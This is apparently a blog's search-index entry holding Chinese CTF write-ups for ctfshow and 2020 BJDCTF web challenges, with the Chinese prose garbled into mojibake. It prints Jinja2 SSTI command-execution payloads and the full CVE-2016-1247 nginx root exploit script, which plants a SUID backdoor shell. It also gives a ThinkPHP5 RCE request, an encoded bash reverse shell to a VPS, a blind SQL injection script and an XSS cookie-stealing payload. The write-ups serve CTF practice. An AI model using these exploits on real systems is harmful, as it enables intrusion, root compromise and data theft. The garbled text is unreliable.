fuzz1234ctfshow&#x3D;1#é¡µé¢æ˜¾ç¤º1ctfshow&#x3D;&#123;&#123;1*2&#125;&#125;#é¡µé¢æ˜¾ç¤º2 å¯çŸ¥æ˜¯SSTI payload1?ctfshow&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;proc&#x2F;1&#x2F;environ&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ps -auxå‘ç°æ‰§è¡Œäº†/flag.sh,ä½†æ˜¯æ ¹ç›®å½•ä¸‹é¢æ²¡æœ‰,è¯»å–procä¸‹é¢çš„ä¸€äº›æ–‡ä»¶è¯•è¯•,å¾—åˆ°flag Web3åˆ†æé¢˜ç›®å›¾ç‰‡ä¸­æœ‰caiå­—æ · èšå‰‘è¿æ¥,å¯†ç æ˜¯cai flagåœ¨/ä¸‹é¢,ä½†æ˜¯æ²¡æœ‰æƒé™ ç»ˆç«¯è¿è¡Œps -aux å¾—åˆ°cron,cronæ˜¯linuxçš„å®šæ—¶ä»»åŠ¡,cat /etc/crontabæ–‡ä»¶å¾—åˆ°æœ€ä¸‹é¢ä¸€è¡Œçš„nginxçš„æ—¥å¿—åˆ‡ç‰‡ç¨‹åº,ä¸€æ­¥æ­¥æŸ¥çœ‹æ–‡ä»¶æ·±å…¥åˆ°/var/logç›®å½•ä¸‹,ls -af,å¾—åˆ°error.logæ˜¯rootæƒé™,æœä¸€æœå¾—åˆ°nginxé”™è¯¯é…ç½®error.log rootæƒé™çš„ææƒæ¼æ´ poc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#!&#x2F;bin&#x2F;bash## Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit# nginxed-root.sh (ver. 1.0)## CVE-2016-1247## Discovered and coded by:## Dawid Golunski# dawid[at]legalhackers.com## https:&#x2F;&#x2F;legalhackers.com## Follow https:&#x2F;&#x2F;twitter.com&#x2F;dawid_golunski for updates on this advisory.## ---# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu# etc.) to escalate their privileges from nginx web server user (www-data) to root # through unsafe error log handling.## The exploit waits for Nginx server to be restarted or receive a USR1 signal.# On Debian-based systems the USR1 signal is sent by logrotate (&#x2F;etc&#x2F;logrotate.d&#x2F;nginx)# script which is called daily by the cron.daily on default installations.# The restart should take place at 6:25am which is when cron.daily executes.# Attackers can therefore get a root shell automatically in 24h at most without any admin# interaction just by letting the exploit run till 6:25am assuming that daily logrotation # has been configured. ### Exploit usage:# .&#x2F;nginxed-root.sh path_to_nginx_error.log ## To trigger logrotation for testing the exploit, you can run the following command:## &#x2F;usr&#x2F;sbin&#x2F;logrotate -vf &#x2F;etc&#x2F;logrotate.d&#x2F;nginx## See the full advisory for details at:# https:&#x2F;&#x2F;legalhackers.com&#x2F;advisories&#x2F;Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html## Video PoC:# https:&#x2F;&#x2F;legalhackers.com&#x2F;videos&#x2F;Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html### Disclaimer:# For testing purposes only. Do no harm.## http:&#x2F;&#x2F;www.debian.cn&#x2F;#BACKDOORSH&#x3D;&quot;&#x2F;bin&#x2F;bash&quot;BACKDOORPATH&#x3D;&quot;&#x2F;tmp&#x2F;nginxrootsh&quot;PRIVESCLIB&#x3D;&quot;&#x2F;tmp&#x2F;privesclib.so&quot;PRIVESCSRC&#x3D;&quot;&#x2F;tmp&#x2F;privesclib.c&quot;SUIDBIN&#x3D;&quot;&#x2F;usr&#x2F;bin&#x2F;sudo&quot;function cleanexit &#123;# Cleanup echo -e &quot;\\n[+] Cleaning up...&quot;rm -f $PRIVESCSRCrm -f $PRIVESCLIBrm -f $ERRORLOGtouch $ERRORLOGif [ -f &#x2F;etc&#x2F;ld.so.preload ]; thenecho -n &gt; &#x2F;etc&#x2F;ld.so.preloadfiecho -e &quot;\\n[+] Job done. Exiting with code $1 \\n&quot;exit $1&#125;function ctrl_c() &#123; echo -e &quot;\\n[+] Ctrl+C pressed&quot;cleanexit 0&#125;#intro cat &lt;&lt;_eascii_ _______________________________&lt; Is your server (N)jinxed ? ;o &gt; ------------------------------- \\ \\ __---__ _- &#x2F;--______ __--( &#x2F; \\ )XXXXXXXXXXX\\v. .-XXX( O O )XXXXXXXXXXXXXXX- &#x2F;XXX( U ) XXXXXXX\\ &#x2F;XXXXX( )--_ XXXXXXXXXXX\\ &#x2F;XXXXX&#x2F; ( O ) XXXXXX \\XXXXX\\ XXXXX&#x2F; &#x2F; XXXXXX \\__ \\XXXXX XXXXXX__&#x2F; XXXXXX \\__----&gt; ---___ XXX__&#x2F; XXXXXX \\__ &#x2F; \\- --__&#x2F; ___&#x2F;\\ XXXXXX &#x2F; ___--&#x2F;&#x3D; \\-\\ ___&#x2F; XXXXXX &#39;--- XXXXXX \\-\\&#x2F;XXX\\ XXXXXX &#x2F;XXXXX \\XXXXXXXXX \\ &#x2F;XXXXX&#x2F; \\XXXXXX &gt; _&#x2F;XXXXX&#x2F; \\XXXXX--__&#x2F; __-- XXXX&#x2F; -XXXXXXXX--------------- XXXXXX- \\XXXXXXXXXXXXXXXXXXXXXXXXXX&#x2F; &quot;&quot;VXXXXXXXXXXXXXXXXXXV&quot;&quot;_eascii_echo -e &quot;\\033[94m \\nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \\nnginxed-root.sh (ver. 1.0)\\n&quot;echo -e &quot;Discovered and coded by: \\n\\nDawid Golunski \\nhttps:&#x2F;&#x2F;legalhackers.com \\033[0m&quot;# Argsif [ $# -lt 1 ]; thenecho -e &quot;\\n[!] Exploit usage: \\n\\n$0 path_to_error.log \\n&quot;echo -e &quot;It seems that this server uses: &#96;ps aux | grep nginx | awk -F&#39;log-error&#x3D;&#39; &#39;&#123; print $2 &#125;&#39; | cut -d&#39; &#39; -f1 | grep &#39;&#x2F;&#39;&#96;\\n&quot;exit 3fi# Priv checkecho -e &quot;\\n[+] Starting the exploit as: \\n\\033[94m&#96;id&#96;\\033[0m&quot;id | grep -q www-dataif [ $? -ne 0 ]; thenecho -e &quot;\\n[!] You need to execute the exploit as www-data user! Exiting.\\n&quot;exit 3fi# Set target pathsERRORLOG&#x3D;&quot;$1&quot;if [ ! -f $ERRORLOG ]; thenecho -e &quot;\\n[!] The specified Nginx error log ($ERRORLOG) doesn&#39;t exist. Try again.\\n&quot;exit 3fi# [ Exploitation ]trap ctrl_c INT# Compile privesc preload libraryecho -e &quot;\\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;sys&#x2F;stat.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt; #include &lt;sys&#x2F;types.h&gt; #include &lt;sys&#x2F;stat.h&gt; #include &lt;fcntl.h&gt;uid_t geteuid(void) &#123;static uid_t (*old_geteuid)();old_geteuid &#x3D; dlsym(RTLD_NEXT, &quot;geteuid&quot;);if ( old_geteuid() &#x3D;&#x3D; 0 ) &#123;chown(&quot;$BACKDOORPATH&quot;, 0, 0);chmod(&quot;$BACKDOORPATH&quot;, 04777);unlink(&quot;&#x2F;etc&#x2F;ld.so.preload&quot;);&#125;return old_geteuid();&#125;_solibeof_&#x2F;bin&#x2F;bash -c &quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;if [ $? -ne 0 ]; thenecho -e &quot;\\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;cleanexit 2;fi# Prepare backdoor shellcp $BACKDOORSH $BACKDOORPATHecho -e &quot;\\n[+] Backdoor&#x2F;low-priv shell installed at: \\n&#96;ls -l $BACKDOORPATH&#96;&quot;# Safety checkif [ -f &#x2F;etc&#x2F;ld.so.preload ]; thenecho -e &quot;\\n[!] &#x2F;etc&#x2F;ld.so.preload already exists. Exiting for safety.&quot;exit 2fi# Symlink the log filerm -f $ERRORLOG &amp;&amp; ln -s &#x2F;etc&#x2F;ld.so.preload $ERRORLOGif [ $? -ne 0 ]; thenecho -e &quot;\\n[!] Couldn&#39;t remove the $ERRORLOG file or create a symlink.&quot;cleanexit 3fiecho -e &quot;\\n[+] The server appears to be \\033[94m(N)jinxed\\033[0m (writable logdir) ! :) Symlink created at: \\n&#96;ls -l $ERRORLOG&#96;&quot;# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggeredcurl http:&#x2F;&#x2F;localhost&#x2F; &gt;&#x2F;dev&#x2F;null 2&gt;&#x2F;dev&#x2F;null# Wait for Nginx to re-open the logs&#x2F;USR1 signal after the logrotation (if daily # rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)echo -ne &quot;\\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...&quot;while :; do sleep 1if [ -f &#x2F;etc&#x2F;ld.so.preload ]; thenecho $PRIVESCLIB &gt; &#x2F;etc&#x2F;ld.so.preloadrm -f $ERRORLOGbreak;fidone# &#x2F;etc&#x2F;ld.so.preload should be owned by www-data user at this point# Inject the privesc.so shared library to escalate privilegesecho $PRIVESCLIB &gt; &#x2F;etc&#x2F;ld.so.preloadecho -e &quot;\\n[+] Nginx restarted. The &#x2F;etc&#x2F;ld.so.preload file got created with web server privileges: \\n&#96;ls -l &#x2F;etc&#x2F;ld.so.preload&#96;&quot;echo -e &quot;\\n[+] Adding $PRIVESCLIB shared lib to &#x2F;etc&#x2F;ld.so.preload&quot;echo -e &quot;\\n[+] The &#x2F;etc&#x2F;ld.so.preload file now contains: \\n&#96;cat &#x2F;etc&#x2F;ld.so.preload&#96;&quot;chmod 755 &#x2F;etc&#x2F;ld.so.preload# Escalating privileges via the SUID binary (e.g. &#x2F;usr&#x2F;bin&#x2F;sudo)echo -e &quot;\\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;sudo 2&gt;&#x2F;dev&#x2F;null &gt;&#x2F;dev&#x2F;null# Check for the rootshellls -l $BACKDOORPATHls -l $BACKDOORPATH | grep rws | grep -q rootif [ $? -eq 0 ]; then echo -e &quot;\\n[+] Rootshell got assigned root SUID perms at: \\n&#96;ls -l $BACKDOORPATH&#96;&quot;echo -e &quot;\\n\\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\\033[0m&quot;elseecho -e &quot;\\n[!] Failed to get root&quot;cleanexit 2firm -f $ERRORLOGecho &gt; $ERRORLOG # Use the rootshell to perform cleanup that requires root privilges$BACKDOORPATH -p -c &quot;rm -f &#x2F;etc&#x2F;ld.so.preload; rm -f $PRIVESCLIB&quot;# Reset the logging to error.log$BACKDOORPATH -p -c &quot;kill -USR1 &#96;pidof -s nginx&#96;&quot;# Execute the rootshellecho -e &quot;\\n[+] Spawning the rootshell $BACKDOORPATH now! \\n&quot;$BACKDOORPATH -p -i# Job done.cleanexit 0ï¼šDebianã€ubuntuå‘è¡Œç‰ˆçš„Nginxæœ¬åœ°ææƒæ¼æ´ï¼ˆå«POCï¼‰ å°†pocä¸Šä¼ åˆ°/var/www/html/ç›®å½•ä¸‹é¢,æ›´æ”¹777æƒé™,æ›´æ”¹æ–‡ä»¶åä¸ºpoc.sh åœ¨èšå‰‘çš„ç»ˆç«¯ä¸­ç”¨bashåå¼¹ä¸€ä¸ªshellåˆ°vps,ç„¶ååœ¨vpsæ‰§è¡Œä¸€ä¸‹å‘½ä»¤,ç­‰å¾…cronå®šæ—¶ä»»åŠ¡æ‰§è¡Œ,è§¦å‘æ¼æ´å¾—åˆ°rootæƒé™ 123cd &#x2F;var&#x2F;www&#x2F;html&#x2F;.&#x2F;poc.sh &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.logcat &#x2F;flag Web5åˆ†æfuzzä¸€ä¸‹åªèƒ½5ä¸ªå­—ç¬¦,or and =ä¸èƒ½ç”¨ ä½†æ˜¯&amp;&amp; || &lt;&gt;å¯ä»¥,åªèƒ½äº”ä¸ªå­—ç¬¦,ä¾¿æ€è€ƒé€»è¾‘ 1234--çŒœæµ‹åå°sqlselect * from table where username&#x3D;&#39;&#39; and password&#x3D;&#39;&#39;--æ„é€ é€»è¾‘select * from table where username&#x3D;&#39;1&#39;&lt;&#39;2&#39; and password&#x3D;&#39;1&#39;&lt;&#39;2&#39; payload1u&#x3D;1&#39;&lt;&#39;2&amp;p&#x3D;1&#39;&lt;&#39;2 Web6åˆ†æevalä»¥åˆ†å·ä½œä¸ºè¯­å¥åˆ†éš”ç¬¦,ç›´æ¥ç»“æŸå‰é¢ä¸€æ®µä»£ç å¦èµ·ç‚‰ç¶ payload12a;phpinfo();a;system(&#39;cat &#x2F;var&#x2F;falg.txt&#39;) flagæ‰¾ä¸€æ‰¾åœ¨varä¸‹é¢ å¯†ç å¯†ç 2ä¸‹è½½å¾—åˆ°æ–‡ä»¶,ctfæ›¿æ¢.showæ›¿æ¢-morseè§£ç åœ¨å¾—åˆ°äº†FLAGå››ä¸ªå­— ç„¶ååé¢éƒ½æ˜¯å››ä¸ª16è¿›åˆ¶ç ä¸€ç»„,utf-8è§£ç å¾—åˆ°flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"2020ç¬¬äºŒå±ŠBJDCTF","date":"2020-03-22T16:00:00.000Z","path":"2020/03/23/CTF_WP/BJDCTFWP/","text":"2020ç¬¬äºŒå±ŠBJDCTFWEBfakegoogleæºç æ³¨é‡Šæ˜¯SSTI payload 12&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; old_hackåˆ©ç”¨çš„æ˜¯thinkphp5çš„RCEæ¼æ´ payload 12http:&#x2F;&#x2F;a06ef095-a650-4053-96ad-444239c9d4db.node3.buuoj.cn&#x2F;?s&#x3D;captchapost data:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag duangshellä¸‹è½½.index.php.swp, 12vim index.php#æŒ‰Rè¿˜åŸå‡ºæºç  æ³¨å†Œå°å·ç”³è¯·é¶æœº,ifconfigå¾—åˆ°é¶æœºçš„ip,åˆ©ç”¨bashæ„é€ ä¸€å¥è¯åå¼¹shell,ä¸¤æ¬¡baseç¼–ç åå‘é€payload payload 1ec&#39;&#39;ho &quot;WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE56UXVNUzQwT0M0M01DODRPRGc0SURBK0pqRT0&#x3D;&quot;|bas&#39;&#39;e64 -d|bas&#39;&#39;e64 -d|bash ç®€å•æ³¨å…¥æ³¨å…¥è„šæœ¬ 123456789101112131415161718192021222324import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;796d3f72-9ab1-4366-a553-0f1bee62ea1c.node3.buuoj.cn&#x2F;&quot;flag&#x3D;&quot;&quot;for i in range(1,100): high &#x3D; 127 low &#x3D; 32 mid &#x3D; (low + high) &#x2F;&#x2F; 2 while high &gt; low: # password&#x3D;&#39;or ascii(substr(username,%s,1))&gt;%s#&#39;%(str(i),str(mid)) password &#x3D; &#39;or ascii(substr(password,%s,1))&gt;%s#&#39; % (str(i), str(mid)) payload &#x3D; &#123;&#39;username&#39;:&quot;\\\\&quot;, &#39;password&#39;:password&#125; # print(payload) r&#x3D;requests.post(url,data&#x3D;payload) if &#39;BJD needs to be stronger&#39; in r.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (low + high) &#x2F;&#x2F; 2 print(chr(int(mid)),end&#x3D;&quot;&quot;) flag+&#x3D;chr(int(mid)) print(&quot; | &quot;+flag)#ç»“æœ,ç™»å½•å¾—åˆ°flagadminOhyOuFOuNdit å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€ç™»å½•adminæç¤ºä¸æ˜¯admin,éšä¾¿è¾“ä¸€ä¸ªtest,ç™»å½•ä¸Š,æŠ“åŒ…å‘ç°æ³¨é‡ŠL0g1n.php è®¿é—®L0g1n.php.php 1234567891011121314151617181920212223242526272829303132333435363738#æç¤ºSorry, this site will be available after totally 99 years!#æŸ¥çœ‹cookieså‘ç°æœ‰ä¸ªtimeæ”¹æˆ9999999999#æç¤ºSorry, this site is only optimized for those who comes from localhostä¿®æ”¹X-Forwarded-For:127.0.0.1#æç¤ºDo u think that I dont know X-Forwarded-For?Too young too simple sometimes naive#ä¿®æ”¹Client-IP:127.0.0.1#æç¤ºSorry, this site is only optimized for those who come from gem-love.com#ä¿®æ”¹Referer:gem-love.com#æç¤ºSorry, this site is only optimized for browsers that run on Commodo 64#ä¿®æ”¹User-Agent:Commodo 64#æç¤ºno no no i think it is not the real commmodo 64,what is the real ua for Commdo?#google commmodo 64æœ‰ä¸€ä¸­è®¡ç®—æœºå«Commodore 64#ä¿®æ”¹User-Agent:Commodore 64#æç¤ºSorry, this site is only optimized for those whose email is root@gem-love.com#google http head email å‘ç°æœ‰ä¸€ä¸ªå¤´å«from#ä¿®æ”¹From:root@gem-love.com#æç¤ºSorry, this site is only optimized for those who use the http proxy of y1ng.vip if you dont have the proxy, pls contact us to buy, ï¿¥100&#x2F;Month#Via ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯#ä¿®æ”¹Via:y1ng.vip#F12æŸ¥çœ‹å…ƒç´ &lt;!--ZmxhZ3tlYzI2ZmNhMS1mYWRmLTQ0YmItYTEyYS1lNjdjOWU5NTg3Nzh9Cg&#x3D;&#x3D;--&gt;base64è§£ç flag&#123;ec26fca1-fadf-44bb-a12a-e67c9e958778&#125; SchroÌˆdingeræŸ¥çœ‹ç½‘é¡µæºä»£ç æœ‰ä¸ªtest.php,è¿‡å»çœ‹ä¸€çœ¼æ˜¯ç™»å½•æ¡†,é¦–é¡µæ˜¯ä¸€ä¸ªå¯†ç çˆ†ç ´,äºæ˜¯è®©ä»–è‡ªå·±çˆ†ç ´è‡ªå·± ç™»å½•æ¡†è¾“å…¥http://127.0.0.1/test.php,æŒ‰input,å¼¹çª—æç¤ºURL Confirmed.æŸ¥çœ‹cookies dXNlcg=MTU4NTAxNTkwMw%3D%3Dbase64è§£ç å¾—åˆ°user=1585015903,ç”¨edit cookiesæ’ä»¶ç½®ç©º,åˆ·æ–°é¡µé¢99%äº†,ç‚¹check,å¾—åˆ°avå·,æŸ¥çœ‹è¯„è®ºåŒºæŒ‰æ—¶é—´æ’åº,æŸ¥çœ‹æœ€è¿‘çš„è¯„è®º,å¾—åˆ°flag XSSä¹‹å…‰æ‰«ç›®å½•å‘ç°gitæ³„éœ²,githackæ¢å¤å¾—åˆ°æºä»£ç  123456789&lt;?php$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];echo unserialize($a);&lt;?php#åˆ©ç”¨åŸç”Ÿç±»xss$a &#x3D; new Exception(&#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;);#ç”±äºæºä»£ç æœ‰ä¸ªechoç›´æ¥ååºåˆ—åŒ–å­—ç¬¦ä¸²$a &#x3D; &#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;;echo urlencode(serialize($a)); ä¼ è¿‡å»å¾—åˆ°flag elementmasteræ£€æŸ¥å…ƒç´ å‘ç° 12&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;706870&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;p&gt; hexè§£ç å¾—åˆ°Po.php ä½¿ç”¨bpéå†å…ƒç´ å‘¨æœŸè¡¨ä¸­çš„å…ƒç´ .php å¾—åˆ°And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php,è®¿é—®å¾—åˆ°flag æ–‡ä»¶æ¢æµ‹headé‡Œé¢æœ‰hint home.php è®¿é—®,å‘ç°urlåŒ…å«äº†system.php ä½¿ç”¨ä¼ªåè®® 12&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;system&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;home å¾—åˆ°æºä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&#x2F;&#x2F;system.php&lt;?phperror_reporting(0);if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123; echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;; header(&quot;Refresh:0.1;url&#x3D;index.php&quot;); die;&#125;$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;&lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;title&gt;File Detector&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt; &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;section&gt; &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;div class&#x3D;&quot;simform-inner&quot;&gt; &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt; &lt;ol class&#x3D;&quot;questions&quot;&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ çŸ¥é“ç›®å½•ä¸‹éƒ½æœ‰ä»€ä¹ˆæ–‡ä»¶å—?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;è¯·è¾“å…¥ä½ æƒ³æ£€æµ‹æ–‡ä»¶å†…å®¹é•¿åº¦çš„url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ å¸Œæœ›ä»¥ä½•ç§æ–¹å¼è®¿é—®ï¼ŸGETï¼ŸPOST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ol&gt; &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;æäº¤&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;controls&quot;&gt; &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt; &lt;span class&#x3D;&quot;number&quot;&gt; &lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;form&gt; &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;&lt;&#x2F;section&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; var theForm &#x3D; document.getElementById( &#39;theForm&#39; ); new stepsForm( theForm, &#123; onSubmit : function( form ) &#123; classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; ); var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; ); form.submit(); messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;; classie.addClass( messageEl, &#39;show&#39; ); &#125; &#125; );&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php$filter1 &#x3D; &#39;&#x2F;^http:\\&#x2F;\\&#x2F;127\\.0\\.0\\.1\\&#x2F;&#x2F;i&#39;;$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123; $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;; $method &#x3D; $_POST[&#39;q3&#39;]; $str1 &#x3D; &quot;~$ python fuck.py -u \\&quot;&quot;.$url .&quot;\\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123; die($str4); &#125; $detect &#x3D; @file_get_contents($url, false); print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#125;?&gt; åˆ©ç”¨sprintfæ ¼å¼åŒ–å­—ç¬¦æ¼æ´ payload 